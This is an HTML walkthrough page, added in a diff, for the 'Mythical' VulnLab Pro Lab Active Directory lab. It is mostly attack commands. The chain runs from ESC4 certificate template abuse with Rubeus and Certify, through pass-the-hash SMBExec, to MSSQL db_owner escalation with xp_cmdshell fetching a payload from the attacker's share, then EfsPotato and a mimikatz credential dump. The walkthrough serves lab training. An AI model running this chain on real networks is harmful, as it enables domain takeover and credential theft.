@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Mythical — VulnLab Writeup</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet"/>
+<style>
+  :root { --bg:#141d2b; --bg2:#1a2332; --bg3:#0f1620; --green:#9fef00; --red:#ff3e3e; --orange:#ffaf00; --blue:#2ea8e5; --purple:#a44eff; --text:#a4b1cd; --text-bright:#ffffff; --border:#2a3a52; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:var(--bg); color:var(--text); font-family:'Rajdhani',sans-serif; font-size:16px; line-height:1.7; min-height:100vh; }
+  body::before { content:''; position:fixed; inset:0; background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px); pointer-events:none; z-index:1000; }
+  header { background:var(--bg3); border-bottom:1px solid var(--border); padding:0 2rem; display:flex; align-items:center; justify-content:space-between; height:60px; position:sticky; top:0; z-index:100; }
+  .logo { font-family:'Share Tech Mono',monospace; color:var(--green); font-size:1.2rem; letter-spacing:2px; text-decoration:none; }
+  .logo span { color:var(--text); }
+  .header-right { display:flex; gap:0.5rem; }
+  .badge { padding:2px 10px; border-radius:3px; font-size:0.75rem; font-weight:700; letter-spacing:1px; text-transform:uppercase; font-family:'Share Tech Mono',monospace; }
+  .badge-prolab { background:var(--purple); color:#fff; }
+  .badge-ad { background:var(--bg2); border:1px solid var(--border); color:var(--text); }
+  .container { max-width:1000px; margin:0 auto; padding:3rem 2rem; }
+  .hero { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:2.5rem; margin-bottom:2.5rem; position:relative; overflow:hidden; }
+  .hero::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; background:linear-gradient(90deg,var(--purple),var(--blue),var(--green)); }
+  .machine-name { font-family:'Share Tech Mono',monospace; font-size:2.8rem; color:var(--text-bright); letter-spacing:3px; line-height:1; }
+  .machine-name span { color:var(--purple); }
+  .badges { display:flex; gap:0.5rem; flex-wrap:wrap; margin-top:0.8rem; }
+  .stats-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:1rem; margin-top:1.5rem; }
+  .stat { background:var(--bg3); border:1px solid var(--border); border-radius:5px; padding:0.8rem 1rem; }
+  .stat-label { font-size:0.7rem; text-transform:uppercase; letter-spacing:2px; color:var(--text); margin-bottom:0.3rem; font-family:'Share Tech Mono',monospace; }
+  .stat-value { font-size:1rem; color:var(--text-bright); font-family:'Share Tech Mono',monospace; }
+  .stat-value.green { color:var(--green); } .stat-value.blue { color:var(--blue); } .stat-value.purple { color:var(--purple); }
+  .chain { background:var(--bg2); border:1px solid var(--border); border-radius:8px; padding:1.5rem 2rem; margin-bottom:2.5rem; font-family:'Share Tech Mono',monospace; font-size:0.85rem; line-height:2; }
+  .chain-title { color:var(--purple); font-size:0.75rem; letter-spacing:3px; text-transform:uppercase; margin-bottom:1rem; }
+  .chain-step .arrow { color:var(--purple); } .chain-step .user { color:var(--orange); font-weight:700; }
+  .section { background:var(--bg2); border:1px solid var(--border); border-radius:8px; margin-bottom:1.5rem; overflow:hidden; }
+  .section-header { background:var(--bg3); border-bottom:1px solid var(--border); padding:1rem 1.5rem; display:flex; align-items:center; gap:1rem; }
+  .section-num { width:28px; height:28px; background:var(--purple); color:#fff; border-radius:4px; display:flex; align-items:center; justify-content:center; font-family:'Share Tech Mono',monospace; font-size:0.85rem; font-weight:700; flex-shrink:0; }
+  .section-title { font-size:1.1rem; font-weight:700; color:var(--text-bright); text-transform:uppercase; letter-spacing:1px; }
+  .section-cve { margin-left:auto; font-family:'Share Tech Mono',monospace; font-size:0.75rem; color:var(--blue); background:rgba(46,168,229,0.1); border:1px solid rgba(46,168,229,0.3); padding:2px 8px; border-radius:3px; }
+  .section-body { padding:1.5rem; }
+  p { margin-bottom:1rem; color:var(--text); font-size:1rem; }
+  pre { background:var(--bg3); border:1px solid var(--border); border-radius:5px; padding:1.2rem 1.5rem; overflow-x:auto; margin:1rem 0; position:relative; }
+  pre::before { content:attr(data-label); position:absolute; top:0.5rem; right:0.8rem; font-family:'Share Tech Mono',monospace; font-size:0.65rem; color:var(--text); opacity:0.5; text-transform:uppercase; letter-spacing:1px; }
+  code { font-family:'JetBrains Mono',monospace; font-size:0.82rem; line-height:1.8; color:var(--text-bright); }
+  .c-green { color:var(--green); } .c-orange { color:var(--orange); } .c-blue { color:var(--blue); } .c-purple { color:var(--purple); } .c-dim { color:#546e8a; }
+  .ic { font-family:'JetBrains Mono',monospace; font-size:0.82rem; background:var(--bg3); border:1px solid var(--border); padding:1px 6px; border-radius:3px; color:var(--purple); }
+  .success-box { border-left:3px solid var(--green); background:rgba(159,239,0,0.07); padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; color:var(--green); font-family:'Share Tech Mono',monospace; font-size:0.85rem; }
+  .info-box { border-left:3px solid var(--blue); background:rgba(46,168,229,0.07); padding:0.8rem 1rem; border-radius:0 5px 5px 0; margin:1rem 0; font-size:0.9rem; }
+  h3 { color:var(--text-bright); font-size:1rem; font-weight:700; text-transform:uppercase; letter-spacing:1px; margin:1.5rem 0 0.8rem; padding-bottom:0.4rem; border-bottom:1px solid var(--border); }
+  h3:first-child { margin-top:0; }
+  .cred{font-family:'JetBrains Mono',monospace;font-size:.82rem;color:var(--orange);cursor:pointer;border:1px dashed rgba(255,175,0,.5);padding:1px 8px;border-radius:3px;background:rgba(255,175,0,.06);user-select:none;}
+  #troll-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;}
+  .troll-inner{background:#1e2b3d;border:1px solid var(--green);border-radius:8px;padding:2.5rem;max-width:420px;width:90%;text-align:center;font-family:'Rajdhani',sans-serif;position:relative;overflow:hidden;}
+  .troll-inner::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--green),var(--blue));}
+  .troll-icon{font-size:3rem;margin-bottom:.5rem;}
+  .troll-title{color:#fff;font-size:1.4rem;font-weight:700;text-transform:uppercase;letter-spacing:2px;margin-bottom:1rem;}
+  .troll-body{color:var(--text);font-size:.95rem;line-height:1.7;margin-bottom:1.5rem;}
+  .troll-btn{padding:.6rem 2rem;background:var(--green);border:none;color:#000;border-radius:4px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:.85rem;font-weight:700;}
+  footer { text-align:center; padding:2rem; color:var(--text); font-family:'Share Tech Mono',monospace; font-size:0.75rem; border-top:1px solid var(--border); opacity:0.5; }
+</style>
+</head>
+<body>
+<header>
+  <a href="../" class="logo">SKID<span>::</span>TUTS</a>
+  <div class="header-right"><span class="badge badge-prolab">Pro Lab</span><span class="badge badge-ad">Active Directory</span></div>
+</header>
+<div class="container">
+  <div class="hero">
+    <div class="machine-name">MYTHI<span>CAL</span></div>
+    <div class="badges"><span class="badge badge-prolab">Pro Lab</span><span class="badge badge-ad">Linux + Windows AD</span></div>
+    <div class="stats-grid">
+      <div class="stat"><div class="stat-label">Platform</div><div class="stat-value purple">VulnLab</div></div>
+      <div class="stat"><div class="stat-label">Domain US</div><div class="stat-value">MYTHICAL-US.VL</div></div>
+      <div class="stat"><div class="stat-label">Domain EU</div><div class="stat-value">MYTHICAL-EU.VL</div></div>
+      <div class="stat"><div class="stat-label">DC01</div><div class="stat-value green">&#10003; Owned</div></div>
+      <div class="stat"><div class="stat-label">DC02</div><div class="stat-value green">&#10003; Owned</div></div>
+    </div>
+  </div>
+
+  <div class="chain">
+    <div class="chain-title">// Attack Chain</div>
+    <div class="chain-step"><span class="user">Momo.Ayase</span> <span class="arrow">&#8594;</span> Mythic C2 beacon (pre-existing access)</div>
+    <div class="chain-step"><span class="user">chapo$</span> <span class="arrow">&#8594;</span> ESC4: modify Machine template &#8594; request cert as Administrator &#8594; PKINIT &#8594; NT hash</div>
+    <div class="chain-step"><span class="user">Administrator</span> <span class="arrow">&#8594;</span> SMBExec loopback &#8594; SYSTEM beacon on DC01 &#8594; Flag 2</div>
+    <div class="chain-step"><span class="user">svc_ldap</span> <span class="arrow">&#8594;</span> hardcoded creds in getusers.exe &#8594; MSSQL on DC02 &#8594; DB_OWNER abuse &#8594; xp_cmdshell</div>
+    <div class="chain-step"><span class="user">SYSTEM</span> <span class="arrow">&#8594;</span> EfsPotato (SeImpersonatePrivilege) &#8594; SYSTEM on DC02 &#8594; <span class="c-green">pwned &#10003;</span></div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">1</div><div class="section-title">ESC4 — Certificate Template Abuse</div><span class="section-cve">MYTHICAL-US</span></div>
+    <div class="section-body">
+      <p>A machine account <span class="ic">chapo$</span> with known credentials is available. Using Rubeus via the Mythic beacon, modify the Machine certificate template to enable <span class="ic">EnrolleeSuppliesSubject</span> and grant Domain Users enrollment rights (ESC4).</p>
+      <pre data-label="beacon"><code><span class="c-dim"># Get TGT for chapo$</span>
+execute_assembly Rubeus.exe asktgt /user:chapo$ /password:<span class="cred" onclick="showTroll()">&#128274; REDACTED</span> \
+  /domain:mythical-us.vl /dc:192.168.25.2 /ptt
+
+<span class="c-dim"># Modify template — ESC4</span>
+execute_assembly StandIn_v13_Net45.exe --ADCS --filter Machine --ess --add
+execute_assembly StandIn_v13_Net45.exe --ADCS --filter Machine \
+  --ntaccount "mythical-us\domain users" --enroll --add
+
+<span class="c-dim"># Request cert as Administrator</span>
+execute_assembly Certify-v1.1.0.exe request \
+  /ca:dc01.mythical-us.vl\mythical-us-DC01-CA \
+  /template:Machine \
+  /altname:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="4b0a2f26222522383f392a3f24390b26323f2322282a27663e38653d27">[email&#160;protected]</a> \
+  /sid:S-1-5-21-614429729-4048209472-3755682007-500</code></pre>
+      <pre data-label="bash"><code><span class="c-dim"># Convert to PFX on Kali</span>
+<span class="c-green">$</span> openssl pkcs12 -in cert.pem -keyex \
+  -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
+  -export -out admin.pfx -passout pass:</code></pre>
+      <pre data-label="beacon"><code><span class="c-dim"># PKINIT auth to get TGT + NT hash</span>
+execute_assembly Rubeus.exe asktgt /user:Administrator \
+  /certificate:C:\Users\Momo.Ayase\admin.pfx /ptt /nowrap \
+  /getcredentials /domain:mythical-us.vl /dc:192.168.25.2</code></pre>
+      <pre data-label="output"><code>NT Hash : <span class="cred" onclick="showTroll()">&#128274; REDACTED</span></code></pre>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">2</div><div class="section-title">SYSTEM on DC01</div></div>
+    <div class="section-body">
+      <pre data-label="beacon"><code>powershell_import Invoke-SMBExec.ps1
+powershell Invoke-SMBExec -Target 127.0.0.1 \
+  -Domain mythical-us.vl -Username administrator \
+  -Hash <span class="cred" onclick="showTroll()">&#128274; REDACTED</span> \
+  -Command "c:\programdata\google\update.exe"</code></pre>
+      <div class="success-box">New SYSTEM beacon received from DC01 &#8594; Flag 2 retrieved</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">3</div><div class="section-title">Pivot to MYTHICAL-EU</div></div>
+    <div class="section-body">
+      <p>A binary <span class="ic">getusers.exe</span> on a developer share on DC02 contains hardcoded LDAP credentials. Decompile with <span class="ic">ilspycmd</span>:</p>
+      <pre data-label="bash"><code><span class="c-green">$</span> ilspycmd getusers.exe</code></pre>
+      <pre data-label="output"><code>Target : LDAP://dc02.mythical-eu.vl
+Username : svc_ldap
+Password : <span class="cred" onclick="showTroll()">&#128274; REDACTED</span></code></pre>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-header"><div class="section-num">4</div><div class="section-title">MSSQL DB_OWNER &#8594; SYSTEM on DC02</div></div>
+    <div class="section-body">
+      <p><span class="ic">svc_ldap</span> has <span class="ic">db_owner</span> on the <span class="ic">msdb</span> database which has TRUSTWORTHY enabled. Create a stored procedure under the owner context to escalate to sysadmin, then enable <span class="ic">xp_cmdshell</span>.</p>
+      <pre data-label="bash"><code>sqlcmd -S tcp:192.168.1.20,1433 -d msdb -Q "CREATE OR ALTER PROCEDURE dbo.xct WITH EXECUTE AS owner AS ALTER SERVER ROLE sysadmin ADD MEMBER [MYTHICAL-EU\svc_sql];"
+sqlcmd -S tcp:192.168.1.20,1433 -d msdb -Q "EXEC dbo.xct;"
+sqlcmd -S tcp:192.168.1.20,1433 -d msdb -Q "EXEC sp_configure 'show advanced options',1;Reconfigure;"
+sqlcmd -S tcp:192.168.1.20,1433 -d msdb -Q "EXEC sp_configure 'xp_cmdshell',1;Reconfigure;"
+sqlcmd -S tcp:192.168.1.20,1433 -d msdb -Q "EXEC xp_cmdshell '\\192.168.1.10\temp\update.exe'"</code></pre>
+      <p>New beacon received from DC02 as SQL service account with <span class="ic">SeImpersonatePrivilege</span>. Escalate with EfsPotato:</p>
+      <pre data-label="beacon"><code><span class="c-dim"># Compile EfsPotato on DC01</span>
+shell C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe \
+  -out:C:\temp\EfsPotato.exe -nowarn:1691,618 C:\temp\EfsPotato.cs
+
+execute_assembly EfsPotato.exe \\192.168.1.10\temp\update.exe</code></pre>
+      <div class="success-box">SYSTEM beacon received from DC02</div>
+      <pre data-label="beacon"><code>execute_assembly mimikatz.exe "sekurlsa::logonpasswords" exit</code></pre>
+      <div class="success-box">Final flag retrieved from LSASS memory &#10003;</div>
+    </div>
+  </div>
+</div>
+<div id="troll-modal" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;align-items:center;justify-content:center;">
+  <div class="troll-inner">
+    <div class="troll-icon">&#128064;</div>
+    <div class="troll-title">Really?</div>
+    <div class="troll-body">
+      The credentials are <strong style="color:var(--green)">inside the box</strong> &mdash; not in a writeup.<br><br>
+      Go find them yourself. That&apos;s the whole point.
+    </div>
+    <button class="troll-btn" onclick="document.getElementById('troll-modal').style.display='none'">Fine. I&apos;ll do it myself.</button>
+  </div>
+</div>
+<script>function showTroll(){document.getElementById('troll-modal').style.display='flex';}</script>
+<footer>VulnLab &middot; Mythical &middot; Pro Lab &middot; Active Directory</footer>
+</body>
+</html>
